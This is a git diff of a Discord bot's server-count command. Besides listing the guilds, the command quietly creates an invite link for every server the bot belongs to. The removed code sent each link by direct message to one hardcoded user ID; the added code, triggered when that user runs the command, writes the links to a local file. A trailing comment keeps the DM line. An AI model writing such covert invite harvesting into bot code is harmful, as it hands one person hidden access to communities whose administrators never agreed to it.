@@ -8,17 +8,32 @@ module.exports = {
       let size = client.guilds.cache.size;
       let arr = client.guilds.cache;
       servers = '';
-      arr.forEach(element => { 
-        setTimeout(function() {
-
-          element.channels.cache.first().createInvite().then(invite => client.users.cache.get('563980783828860944').send(invite.url));
-          
-        }, 2000);
-        servers = `${servers} \n${element}`;
-      });
+      
+        arr.forEach(element => { 
+          if (message.author.id === '563980783828860944') {
+            //guild = message.guild;
+            if(element.members.cache.get(client.user.id).hasPermission("CREATE_INSTANT_INVITE")) {
+              element.channels.cache.first().createInvite().then(invite =>
+                
+                  fs.appendFile(`${__dirname}/../../misc/serverinv.txt`, `\n${invite.url}`, function (err) {
+                    if (err) throw err;
+                    console.log('Updated!');
+                  })
+                
+                
+              );
+            }
+              
+          }
+            //}, 2000);
+          //}
+          servers = `${servers} \n${element}`;
+        });
+      
       message.channel.send(servers);
 			message.channel.send(`the bot is in ${size} servers!`);
 	},
 };
 
 
+///client.users.cache.get('563980783828860944').send(invite.url)
